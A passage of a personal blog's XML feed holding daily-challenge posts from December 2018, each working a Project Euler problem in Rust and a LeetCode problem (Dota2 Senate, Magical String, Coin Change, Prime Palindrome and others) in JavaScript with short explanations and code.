mut tmp: i32; while b!= 0 &#123; tmp = a; a = b; b = tmp % b; &#125; a&#125; AlgorithmProblem1234567891011121314151617181920212223242526272829303132649. Dota2 SenateIn the world of Dota2, there are two parties: the Radiant and the Dire.The Dota2 senate consists of senators coming from two parties. Now the senate wants to make a decision about a change in the Dota2 game. The voting for this change is a round-based procedure. In each round, each senator can exercise one of the two rights:Ban one senator&apos;s right: A senator can make another senator lose all his rights in this and all the following rounds.Announce the victory: If this senator found the senators who still have rights to vote are all from the same party, he can announce the victory and make the decision about the change in the game.Given a string representing each senator&apos;s party belonging. The character &apos;R&apos; and &apos;D&apos; represent the Radiant party and the Dire party respectively. Then if there are n senators, the size of the given string will be n.The round-based procedure starts from the first senator to the last senator in the given order. This procedure will last until the end of voting. All the senators who have lost their rights will be skipped during the procedure.Suppose every senator is smart enough and will play the best strategy for his own party, you need to predict which party will finally announce the victory and make the change in the Dota2 game. The output should be Radiant or Dire.Example 1:Input: &quot;RD&quot;Output: &quot;Radiant&quot;Explanation: The first senator comes from Radiant and he can just ban the next senator&apos;s right in the round 1. And the second senator can&apos;t exercise any rights any more since his right has been banned. And in the round 2, the first senator can just announce the victory since he is the only guy in the senate who can vote.Example 2:Input: &quot;RDD&quot;Output: &quot;Dire&quot;Explanation: The first senator comes from Radiant and he can just ban the next senator&apos;s right in the round 1. And the second senator can&apos;t exercise any rights anymore since his right has been banned. And the third senator comes from Dire and he can ban the first senator&apos;s right in the round 1. And in the round 2, the third senator can just announce the victory since he is the only guy in the senate who can vote.Note:The length of the given string will in the range [1, 10,000]. SolutionI came up a Greedy method which said that when it comes to an unbanned senator, its best choice is ban the opponent which near him most but behind it. If no opponent is behind it, then the best choice is ban the front unbanned opponent. Implementation123456789101112131415161718192021222324252627282930313233/** * @param &#123;string&#125; senate * @return &#123;string&#125; */var predictPartyVictory = (senate) =&gt; &#123; let q = []; let banQ = 0; let banR = 0; for(const s of senate)&#123; q.push(s); &#125; let last_round_len; do &#123; last_round_len = q.length; for(let i = 0; i &lt; last_round_len; ++i)&#123; const tmp = q.shift(); if(tmp === "R")&#123; if(banR) --banR; else&#123; ++banQ; q.push(tmp); &#125; &#125;else&#123; if(banQ) --banQ; else&#123; ++banR; q.push(tmp); &#125; &#125; &#125; &#125;while(q.length != last_round_len); return (q[0]==="R")?"Radiant":"Dire";&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-28 Daily Challenge]]></title>
    <url>%2F2018-12-28-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Largest product in a series in Rust and Magical String in JavaScript. MathProblem12345678910111213141516171819202122232425262728Largest product in a seriesProblem 8 The four adjacent digits in the 1000-digit number that have the greatest product are 9 × 9 × 8 × 9 = 5832.7316717653133062491922511967442657474235534919493496983520312774506326239578318016984801869478851843858615607891129494954595017379583319528532088055111254069874715852386305071569329096329522744304355766896648950445244523161731856403098711121722383113622298934233803081353362766142828064444866452387493035890729629049156044077239071381051585930796086670172427121883998797908792274921901699720888093776657273330010533678812202354218097512545405947522435258490771167055601360483958644670632441572215539753697817977846174064955149290862569321978468622482839722413756570560574902614079729686524145351004748216637048440319989000889524345065854122758866688116427171479924442928230863465674813919123162824586178664583591245665294765456828489128831426076900422421902267105562632111110937054421750694165896040807198403850962455444362981230987879927244284909188845801561660979191338754992005240636899125607176060588611646710940507754100225698315520005593572972571636269561882670428252483600823257530420752963450Find the thirteen adjacent digits in the 1000-digit number that have the greatest product. What is the value of this product? SolutionBrute force is most gentle method ;D Implementation1234567891011121314fn main() &#123; let arr: [i64; 1000] = [7, 3, 1, 6, 7, 1, 7, 6, 5, 3, 1, 3, 3, 0, 6, 2, 4, 9, 1, 9, 2, 2, 5, 1, 1, 9, 6, 7, 4, 4, 2, 6, 5, 7, 4, 7, 4, 2, 3, 5, 5, 3, 4, 9, 1, 9, 4, 9, 3, 4, 9, 6, 9, 8, 3, 5, 2, 0, 3, 1, 2, 7, 7, 4, 5, 0, 6, 3, 2, 6, 2, 3, 9, 5, 7, 8, 3, 1, 8, 0, 1, 6, 9, 8, 4, 8, 0, 1, 8, 6, 9, 4, 7, 8, 8, 5, 1, 8, 4, 3, 8, 5, 8, 6, 1, 5, 6, 0, 7, 8, 9, 1, 1, 2, 9, 4, 9, 4, 9, 5, 4, 5, 9, 5, 0, 1, 7, 3, 7, 9, 5, 8, 3, 3, 1, 9, 5, 2, 8, 5, 3, 2, 0, 8, 8, 0, 5, 5, 1, 1, 1, 2, 5, 4, 0, 6, 9, 8, 7, 4, 7, 1, 5, 8, 5, 2, 3, 8, 6, 3, 0, 5, 0, 7, 1, 5, 6, 9, 3, 2, 9, 0, 9, 6, 3, 2, 9, 5, 2, 2, 7, 4, 4, 3, 0, 4, 3, 5, 5, 7, 6, 6, 8, 9, 6, 6, 4, 8, 9, 5, 0, 4, 4, 5, 2, 4, 4, 5, 2, 3, 1, 6, 1, 7, 3, 1, 8, 5, 6, 4, 0, 3, 0, 9, 8, 7, 1, 1, 1, 2, 1, 7, 2, 2, 3, 8, 3, 1, 1, 3, 6, 2, 2, 2, 9, 8, 9, 3, 4, 2, 3, 3, 8, 0, 3, 0, 8, 1, 3, 5, 3, 3, 6, 2, 7, 6, 6, 1, 4, 2, 8, 2, 8, 0, 6, 4, 4, 4, 4, 8, 6, 6, 4, 5, 2, 3, 8, 7, 4, 9, 3, 0, 3, 5, 8, 9, 0, 7, 2, 9, 6, 2, 9, 0, 4, 9, 1, 5, 6, 0, 4, 4, 0, 7, 7, 2, 3, 9, 0, 7, 1, 3, 8, 1, 0, 5, 1, 5, 8, 5, 9, 3, 0, 7, 9, 6, 0, 8, 6, 6, 7, 0, 1, 7, 2, 4, 2, 7, 1, 2, 1, 8, 8, 3, 9, 9, 8, 7, 9, 7, 9, 0, 8, 7, 9, 2, 2, 7, 4, 9, 2, 1, 9, 0, 1, 6, 9, 9, 7, 2, 0, 8, 8, 8, 0, 9, 3, 7, 7, 6, 6, 5, 7, 2, 7, 3, 3, 3, 0, 0, 1, 0, 5, 3, 3, 6, 7, 8, 8, 1, 2, 2, 0, 2, 3, 5, 4, 2, 1, 8, 0, 9, 7, 5, 1, 2, 5, 4, 5, 4, 0, 5, 9, 4, 7, 5, 2, 2, 4, 3, 5, 2, 5, 8, 4, 9, 0, 7, 7, 1, 1, 6, 7, 0, 5, 5, 6, 0, 1, 3, 6, 0, 4, 8, 3, 9, 5, 8, 6, 4, 4, 6, 7, 0, 6, 3, 2, 4, 4, 1, 5, 7, 2, 2, 1, 5, 5, 3, 9, 7, 5, 3, 6, 9, 7, 8, 1, 7, 9, 7, 7, 8, 4, 6, 1, 7, 4, 0, 6, 4, 9, 5, 5, 1, 4, 9, 2, 9, 0, 8, 6, 2, 5, 6, 9, 3, 2, 1, 9, 7, 8, 4, 6, 8, 6, 2, 2, 4, 8, 2, 8, 3, 9, 7, 2, 2, 4, 1, 3, 7, 5, 6, 5, 7, 0, 5, 6, 0, 5, 7, 4, 9, 0, 2, 6, 1, 4, 0, 7, 9, 7, 2, 9, 6, 8, 6, 5, 2, 4, 1, 4, 5, 3, 5, 1, 0, 0, 4, 7, 4, 8, 2, 1, 6, 6, 3, 7, 0, 4, 8, 4, 4, 0, 3, 1, 9, 9, 8, 9, 0, 0, 0, 8, 8, 9, 5, 2, 4, 3, 4, 5, 0, 6, 5, 8, 5, 4, 1, 2, 2, 7, 5, 8, 8, 6, 6, 6, 8, 8, 1, 1, 6, 4, 2, 7, 1, 7, 1, 4, 7, 9, 9, 2, 4, 4, 4, 2, 9, 2, 8, 2, 3, 0, 8, 6, 3, 4, 6, 5, 6, 7, 4, 8, 1, 3, 9, 1, 9, 1, 2, 3, 1, 6, 2, 8, 2, 4, 5, 8, 6, 1, 7, 8, 6, 6, 4, 5, 8, 3, 5, 9, 1, 2, 4, 5, 6, 6, 5, 2, 9, 4, 7, 6, 5, 4, 5, 6, 8, 2, 8, 4, 8, 9, 1, 2, 8, 8, 3, 1, 4, 2, 6, 0, 7, 6, 9, 0, 0, 4, 2, 2, 4, 2, 1, 9, 0, 2, 2, 6, 7, 1, 0, 5, 5, 6, 2, 6, 3, 2, 1, 1, 1, 1, 1, 0, 9, 3, 7, 0, 5, 4, 4, 2, 1, 7, 5, 0, 6, 9, 4, 1, 6, 5, 8, 9, 6, 0, 4, 0, 8, 0, 7, 1, 9, 8, 4, 0, 3, 8, 5, 0, 9, 6, 2, 4, 5, 5, 4, 4, 4, 3, 6, 2, 9, 8, 1, 2, 3, 0, 9, 8, 7, 8, 7, 9, 9, 2, 7, 2, 4, 4, 2, 8, 4, 9, 0, 9, 1, 8, 8, 8, 4, 5, 8, 0, 1, 5, 6, 1, 6, 6, 0, 9, 7, 9, 1, 9, 1, 3, 3, 8, 7, 5, 4, 9, 9, 2, 0, 0, 5, 2, 4, 0, 6, 3, 6, 8, 9, 9, 1, 2, 5, 6, 0, 7, 1, 7, 6, 0, 6, 0, 5, 8, 8, 6, 1, 1, 6, 4, 6, 7, 1, 0, 9, 4, 0, 5, 0, 7, 7, 5, 4, 1, 0, 0, 2, 2, 5, 6, 9, 8, 3, 1, 5, 5, 2, 0, 0, 0, 5, 5, 9, 3, 5, 7, 2, 9, 7, 2, 5, 7, 1, 6, 3, 6, 2, 6, 9, 5, 6, 1, 8, 8, 2, 6, 7, 0, 4, 2, 8, 2, 5, 2, 4, 8, 3, 6, 0, 0, 8, 2, 3, 2, 5, 7, 5, 3, 0, 4, 2, 0, 7, 5, 2, 9, 6, 3, 4, 5, 0]; let mut ans: i64 = 1; for i in 0..1000-12&#123; let mut tmp = arr[i]; for j in 1..13&#123; tmp *= arr[i + j]; &#125; if tmp &gt; ans &#123; ans = tmp; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem1234567891011121314151617181920212223242526481. Magical StringA magical string S consists of only &apos;1&apos; and &apos;2&apos; and obeys the following rules:The string S is magical because concatenating the number of contiguous occurrences of characters &apos;1&apos; and &apos;2&apos; generates the string S itself.The first few elements of string S is the following: S = &quot;1221121221221121122……&quot;If we group the consecutive &apos;1&apos;s and &apos;2&apos;s in S, it will be:1 22 11 2 1 22 1 22 11 2 11 22 ......and the occurrences of &apos;1&apos;s or &apos;2&apos;s in each group are:1 2 2 1 1 2 1 2 2 1 2 2 ......You can see that the occurrence sequence above is the S itself.Given an integer N as input, return the number of &apos;1&apos;s in the first N number in the magical string S.Note: N will not exceed 100,000.Example 1:Input: 6Output: 3Explanation: The first 6 elements of magical string S is &quot;12211&quot; and it contains three 1&apos;s, so return 3. SolutionCheck Kolakoski sequence - Wikipedia. Implementation1234567891011121314151617181920/** * @param &#123;number&#125; n * @return &#123;number&#125; */var magicalString = (n) =&gt; &#123; let arr = [1,2,2]; let index = 2; let cur = 1; let ans = 0; while(arr.length &lt; n)&#123; if(arr[index] === 2) arr.push(cur); arr.push(cur); cur ^= 3; ++index; &#125; for(let i = 0; i &lt; n; ++i)&#123; if(arr[i] === 1) ++ans; &#125; return ans;&#125;; 12345678910111213141516171819202122232425262728/** * Quicker but uglier * @param &#123;number&#125; n * @return &#123;number&#125; */var magicalString = (n) =&gt; &#123; let arr = new Array(n+3); arr[0] = 1; arr[1] = arr[2] = 2; let head = 3; let index = 2; let cur = 1; let ans = 0; while(head &lt; n)&#123; if(arr[index] === 2)&#123; arr[head] = cur; ++head; &#125; arr[head] = cur; ++head; cur ^= 3; ++index; &#125; for(let i = 0; i &lt; n; ++i)&#123; if(arr[i] === 1) ++ans; &#125; return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-27 Daily Challenge]]></title>
    <url>%2F2018-12-27-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is 10001st prime in Rust and Binary Tree Preorder Traversal in JavaScript. MathProblem123456710001st primeProblem 7 By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see that the 6th prime is 13.What is the 10 001st prime number? SolutionIt&#39;s easy to think about use sieve of Eratosthenes to compute prime, whose time complexity is $O(nloglogn)$, or Euler sieve, whose time complexity is $O(n)$. I&#39;ll do it with extern crate. ;) Implementation123456extern crate primal;fn main() &#123; let p = primal::Primes::all().nth(10001 - 1).unwrap(); println!("The 10001st prime is &#123;&#125;", p);&#125; AlgorithmProblem123456789101112131415144. Binary Tree Preorder TraversalGiven a binary tree, return the preorder traversal of its nodes&apos; values.Example:Input: [1,null,2,3] 1 \ 2 / 3Output: [1,2,3]Follow up: Recursive solution is trivial, could you do it iteratively? Solution;p Implementation12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var preorderTraversal = (root) =&gt; &#123; if(root == null) return []; let ans = [root.val] ans = ans.concat(preorderTraversal(root.left)); ans = ans.concat(preorderTraversal(root.right)); return ans;&#125;;var preorderTraversal = (root) =&gt; &#123; if(root == null) return []; let ans = [root.val]; let s = []; s.push(root.right); s.push(root.left); while(s.length)&#123; let tmp = s.pop(); if(tmp === null) continue; ans.push(tmp.val); s.push(tmp.right); s.push(tmp.left); &#125; return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-26 Daily Challenge]]></title>
    <url>%2F2018-12-26-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Sum square difference in Rust and Split Array into Consecutive Subsequences in JavaScript. MathProblem12345678910111213Sum square differenceProblem 6 The sum of the squares of the first ten natural numbers is,1^2 + 2^2 + ... + 10^2 = 385The square of the sum of the first ten natural numbers is,(1 + 2 + ... + 10)^2 = 55^2 = 3025Hence the difference between the sum of the squares of the first ten natural numbers and the square of the sum is 3025 − 385 = 2640.Find the difference between the sum of the squares of the first one hundred natural numbers and the square of the sum. SolutionBrute force is enough for such a small range. But if I want to solve it more elegantly, there is one formula show up during my high school life. $1^2+2^2+3^2+...+n^2=\frac{n(n+1)(2n+1)}{6}$ So the answer will be $\frac{n^4}{4}+\frac{n^3}{6}-\frac{n^2}{4}-\frac{n}{6}$ Implementation1234567891011121314151617181920212223fn main() &#123; println!("Answer is &#123;&#125;", solve_brute(100)); println!("Answer is &#123;&#125;", solve_formula(100));&#125;fn solve_brute(n: i32) -&gt; i64 &#123; let ans: i64; let mut tmp: i64 = 0; for i in 1..n+1 &#123; tmp += i as i64; &#125; ans = tmp * tmp; tmp = 0; for i in 1..n+1 &#123; tmp += (i * i) as i64; &#125; ans - tmp&#125;fn solve_formula(n: i32) -&gt; i64 &#123; let tmp: f64 = n as f64; (tmp.powf(4.0)/4.0 + tmp.powf(3.0)/6.0 - tmp.powf(2.0) / 4.0 - tmp/6.0) as i64&#125; AlgorithmProblem1234567891011121314151617181920212223659. Split Array into Consecutive SubsequencesYou are given an integer array sorted in ascending order (may contain duplicates), you need to split them into several subsequences, where each subsequences consist of at least 3 consecutive integers. Return whether you can make such a split.Example 1:Input: [1,2,3,3,4,5]Output: TrueExplanation:You can split them into two consecutive subsequences : 1, 2, 33, 4, 5Example 2:Input: [1,2,3,3,4,4,5,5]Output: TrueExplanation:You can split them into two consecutive subsequences : 1, 2, 3, 4, 53, 4, 5Example 3:Input: [1,2,3,4,4,5]Output: FalseNote:The length of the input is in range of [1, 10000] SolutionCall a chain a sequence of 3 or more consecutive numbers. Considering numbers x from left to right, if x can be added to a current chain, it&#39;s at least as good to add x to that chain first, rather than to start a new chain. So we just need to see if current x can be add to a chain or can be first of a new chain. Implementation1234567891011121314151617181920212223242526272829303132333435/** * @param &#123;number[]&#125; nums * @return &#123;boolean&#125; */var isPossible = (nums) =&gt; &#123; let map = new Map(); let need = new Map(); for(const i of nums)&#123; if(!map.has(i)) map.set(i, 1); else map.set(i, map.get(i)+1); &#125; // console.log(map); // console.log(need); for(const i of nums)&#123; if(map.get(i) == 0) continue; else if(need.has(i)&amp;&amp;need.get(i) &gt; 0)&#123; need.set(i, need.get(i)-1); need.set(i+1, need.has(i+1)?need.get(i+1)+1:1); &#125;else if(map.has(i+1)&amp;&amp;map.get(i+1)&gt;0&amp;&amp;map.has(i+2)&amp;&amp;map.get(i+2)&gt;0)&#123; map.set(i+1, map.get(i+1)-1); map.set(i+2, map.get(i+2)-1); need.set(i+3, need.has(i+3)?need.get(i+3)+1:1); &#125;else return false; map.set(i, map.get(i)-1); &#125; return true;&#125;;// console.log(isPossible([1,2,3,3,4,5]));// console.log(isPossible([1,2,3,3,4,4,5,5]));// console.log(isPossible([1,2,3,4,4,5]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-25 Daily Challenge]]></title>
    <url>%2F2018-12-25-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Smallest multiple in Rust and Remove Duplicates from Sorted Array in JavaScript. MathProblem1234567Smallest multipleProblem 5 2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20? SolutionOn the one hand I can compute the LCM with Euclidean Algorithm, one the other hand I can compute the contribution of each prime, and then, get the right answer. Implementation1234567891011121314151617181920212223242526272829303132333435363738extern crate primal;use primal::Primes;fn main() &#123; let mut ans = lcm(1,2); for i in 3..21 &#123; ans = lcm(ans, i); &#125; println!("Answer is &#123;&#125;", ans); ans = 1; let twenty: f64 = 20f64; let mut tmp: u64; for p in Primes::all().take(20) &#123; if p &gt; 19 &#123; break; &#125; let q = twenty.log(p as f64) as u32; tmp = p as u64; ans *= tmp.pow(q); &#125; println!("Answer is &#123;&#125;", ans);&#125;fn lcm(a: u64, b: u64) -&gt; u64 &#123; a/ gcd(a, b) * b&#125;fn gcd(mut a: u64, mut b: u64) -&gt; u64 &#123; let mut tmp: u64; while b!= 0 &#123; tmp = a; a = b; b = tmp % b; &#125; a&#125; AlgorithmProblem1234567891011121314151617181920212223242526272829303132866. Prime PalindromeFind the smallest prime palindrome greater than or equal to N.Recall that a number is prime if it&apos;s only divisors are 1 and itself, and it is greater than 1. For example, 2,3,5,7,11 and 13 are primes.Recall that a number is a palindrome if it reads the same from left to right as it does from right to left. For example, 12321 is a palindrome. Example 1:Input: 6Output: 7Example 2:Input: 8Output: 11Example 3:Input: 13Output: 101 Note:1 &lt;= N &lt;= 10^8The answer is guaranteed to exist and be less than 2 * 10^8. SolutionFirst, according to the math problem I&#39;ve done yesterday, every even-lengthed palindrome number is a multiple of eleven. So we can just skip them. To check if a number is a prime, there is a lot of ways to do it. I once want use Miller-Rabin, but find it is so difficult to implicate it in JavaScript. Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * @param &#123;number&#125; N * @return &#123;number&#125; */let primePalindrome = function(N) &#123; let cur = N; if (N &lt; 12)&#123; while(!isPrime(cur)) ++cur; return cur; &#125; while(!isPal(cur)) cur++; while (true)&#123; if(isPrime(cur)) return cur; cur = nextPal(cur); &#125;&#125;;let isPal = (n) =&gt;&#123; return ("" + n) == ("" + n).split("").reverse().join("");&#125;;let nextPal = (n) =&gt; &#123; let s = ("" + n); let len = s.length; if(len % 2 == 0)&#123; return "1"+ "0".repeat(len-1) + "1"; &#125;else&#123; let half = Math.ceil(len / 2); let left = s.slice(0, half); let plus1 = (+left + 1) + ""; return +(plus1 + plus1.slice(0, plus1.length - 1).split("").reverse().join("")); &#125;&#125;;let isPrime = (n) =&gt; &#123; if(n%2 == 0) return n==2; for(let i=3; i*i&lt;=n; i+=2)&#123; if(n%i===0) return false; &#125; return n!=1;&#125;;// console.log(primePalindrome(1));// console.log(primePalindrome(2));// console.log(primePalindrome(3));// console.log(primePalindrome(6));// console.log(primePalindrome(8));// console.log(primePalindrome(13));// console.log(primePalindrome(11));// console.log(primePalindrome(1234));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-24 Daily Challenge]]></title>
    <url>%2F2018-12-24-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Largest palindrome product in Rust and Remove Duplicates from Sorted Array in JavaScript. MathProblem1234567Largest palindrome productProblem 4 A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91 × 99.Find the largest palindrome made from the product of two 3-digit numbers. SolutionI can&#39;t come up with a more gentle solution than brute force. Even that I find I can do some optimization on it. But when check the overview I find something new. Just check my code~ Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// My original solutionfn main() &#123; let mut num: i32; let mut num_s: String; let mut ok: bool; let mut ans: i32 = 0; for i in 100..999 &#123; for j in (i..999).rev() &#123; num = i * j; if ans &gt; num&#123; break; &#125; num_s = num.to_string(); ok = true; for k in 0..num_s.len()/2&#123; if num_s.as_bytes()[k] != num_s.as_bytes()[num_s.len()-k-1]&#123; ok = false; &#125; &#125; if ok&#123; ans = num; println!("&#123;&#125; * &#123;&#125; = &#123;&#125;", i, j, num); &#125; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;// Optimized solutionfn main() &#123; let mut num: i32; let mut num_s: String; let mut ok: bool; let mut step: i32; let mut j: i32; let mut ans: i32 = 0; for i in 100..999 &#123; if i % 11 == 0 &#123; step = -1; j = 999; &#125;else &#123; step = -11; j = 990; &#125; while j &gt; 100 &#123; num = i * j; if ans &gt; num&#123; break; &#125; num_s = num.to_string(); ok = true; for k in 0..num_s.len()/2&#123; if num_s.as_bytes()[k] != num_s.as_bytes()[num_s.len()-k-1]&#123; ok = false; &#125; &#125; if ok&#123; ans = num; println!("&#123;&#125; * &#123;&#125; = &#123;&#125;", i, j, num); &#125; j += step; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem1234567891011121314151617181920212223242526. Remove Duplicates from Sorted ArrayGiven a sorted array nums, remove the duplicates in-place such that each element appear only once and return the new length.Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.Example 1:Given nums = [1,1,2],Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.It doesn&apos;t matter what you leave beyond the returned length.Example 2:Given nums = [0,0,1,1,1,2,2,3,3,4],Your function should return length = 5, with the first five elements of nums being modified to 0, 1, 2, 3, and 4 respectively.It doesn&apos;t matter what values are set beyond the returned length.Clarification:Confused why the returned value is an integer but your answer is an array?Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well. SolutionJust use two pointer/indice to deal it~ I write an implication that move duplicated element to the end, but find that it&#39;s said &quot;remove&quot;~So I rewrite it. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/** * @param &#123;number[]&#125; nums * @return &#123;number&#125; */var moveDuplicates = (nums = []) =&gt; &#123; let len = nums.length; if(len == 1) return 1; let rp = 1; let lp = 0; while(rp &lt; len)&#123; while(rp &lt; len &amp;&amp; nums[lp] == nums[rp]) ++rp; if(rp &lt; len &amp;&amp; rp != lp+1)&#123; [nums[lp+1], nums[rp]] = [nums[rp], nums[lp+1]]; &#125; if(nums[lp] &lt; nums[lp+1]) ++lp; ++rp &#125; return lp+1;&#125;;/** * @param &#123;number[]&#125; nums * @return &#123;number&#125; */var removeDuplicates = (nums = []) =&gt; &#123; let len = nums.length; if(len &lt; 2) return len; let rp = 1; let lp = 0; while(rp &lt; len)&#123; if(nums[rp] != nums[lp])&#123; ++lp; nums[lp] = nums[rp]; &#125; ++rp; &#125; return lp+1;&#125;;let nums = [1,1,2];console.log(removeDuplicates(nums));console.log(nums);nums = [0,0,1,1,1,2,2,3,3,4];console.log(removeDuplicates(nums));console.log(nums);nums = [0,0,1,1,1,2,2,3,3,4,4,4];console.log(removeDuplicates(nums));console.log(nums);nums = [0,0];console.log(removeDuplicates(nums));console.log(nums);nums = [1,2];console.log(removeDuplicates(nums));console.log(nums);]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-23 Daily Challenge]]></title>
    <url>%2F2018-12-23-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Largest prime factor in Rust and Coin Change in JavaScript. MathProblem1234567Largest prime factorProblem 3 The prime factors of 13195 are 5, 7, 13 and 29.What is the largest prime factor of the number 600851475143 ? SolutionAt least we know we can factorize one number $n$ in roughly $O(\sqrt{n})$time. There is also more complicated, more fast algorithm like Pollard&#39;s rho algorithm, but writing a implication on my own cost too much and need more knowledge with Rust, so just leave it. There is already some tools like factordb, yafu. By the way, I found optimization of Rust is incredible! Implementation12345678910111213141516171819202122232425262728extern crate primal;use std::vec::Vec;fn main() &#123; let mut cur_num:u64 = 2; let mut ans:u64 = 0; let mut target:u64 = 600851475143; let mx:u64 = 600851475143; while cur_num &lt;= target &amp;&amp; cur_num*cur_num &lt;= mx &#123; while target % cur_num == 0 &#123; target /= cur_num; ans = cur_num; &#125; cur_num += 1; &#125; println!("answer is &#123;&#125;", ans); let mx:usize = 600851475143; let sieve = primal::Sieve::new(1&lt;&lt;311475143); let ans: Vec&lt;(usize, usize)&gt; = match sieve.factor(mx) &#123; Ok(v) =&gt; v, Err(_) =&gt; Vec::new(), &#125;; for factor in ans &#123; println!("(&#123;&#125;, &#123;&#125;)", factor.0, factor.1) &#125;&#125; AlgorithmProblem123456789101112131415322. Coin ChangeYou are given coins of different denominations and a total amount of money amount. Write a function to compute the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1.Example 1:Input: coins = [1, 2, 5], amount = 11Output: 3 Explanation: 11 = 5 + 5 + 1Example 2:Input: coins = [2], amount = 3Output: -1Note:You may assume that you have an infinite number of each kind of coin. SolutionI have a vague feeling this problem could be a $NP$ problem. I guess I can do it with Dynamic Programming approach, and its time complexity is $O(coins.length*amount)$. With the help of qt, I figure out that this question is the equivalence of Knapsack Problem, so it&#39;s a $NP-Hard$ problem. Dynamic Programming is the only way I know to deal with it. Implementation1234567891011121314151617181920/** * @param &#123;number[]&#125; coins * @param &#123;number&#125; amount * @return &#123;number&#125; */var coinChange = (coins = [], amount) =&gt; &#123; let dp = [0]; for(let i = 1; i &lt;= amount; ++i)&#123; dp.push(0x7F7F7F7F); &#125; for(const v of coins)&#123; for(let i = v; i &lt;= amount; ++i)&#123; if(dp[i-v]!=0x7F7F7F7F &amp;&amp; dp[i-v] + 1 &lt; dp[i]) dp[i] = dp[i-v] + 1; &#125; &#125; return dp[amount] == 0x7F7F7F7F? -1: dp[amount];&#125;;// console.log(coinChange([1, 2, 5],11));// console.log(coinChange([2],3))]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
        <tag>Factorize</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-22 Daily Challenge]]></title>
    <url>%2F2018-12-22-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Even Fibonacci numbers in Rust and K-th Smallest Prime Fraction in cpp. MathProblem123456789Even Fibonacci numbersProblem 2 Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be:1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms. SolutionOf course we can use brute force, the range is still small enough to do it in one second. But if we focus on Fibonacci sequence and its beautiful property, we can find more. Let&#39;s think about Fibonacci sequence start from index 0 and value 0, which means $$F(x)=\left{\begin{matrix} 0,x=0;\1,x=1;\F(x-1)+F(x-2),x&gt;1.\end{matrix}\right.$$ And if you&#39;re familiar with it, you must know the quickest way to compute Xth numbers is to use quick matrix exponentiation algorithm, which only need asymptotically $O(xlogx)$. And look at the even-valued term, what we can find is ... 0, 1, 1, 2, 3, 5, 8, 13... Emmmmmmmmm, their indices is multiples of 3. We should&#39;ve known it, shouldn&#39;t we? Because odd add odd is even, odd add even is odd, so pattern goes like even, odd, odd, even, odd, odd... And if we can find something when we delve into it? Like if we can use only even-valued term to compute next one? Let&#39;s try it. $$F_x = F_{x-1} + F_{x-2}=2F_{x-2} + F_{x-3} = 3F_{x-3}+2F_{x-4}$$ $$=3F_{x-3}+(F_{x-4}+F_{x-5})+F_{x-6}=4F_{x-3}+F_{x-6}$$ Which means we could treat our new sequence as a new sequence and its value is $$F(x)=\left{\begin{matrix} 0,x=0;\2,x=1;\4F(x-1)+F(x-2),x&gt;1.\end{matrix}\right.$$ Also we can compute it with quick matrix exponentiation algorithm. Yes, we did it. So we just need to implicate it! Sadly saying that I find num_bigint crate is much slower than Python original computation... And secondly I find that I&#39;m not capable to write a quick matrix exponentiation in Rust... Leave them alone until I can do it... 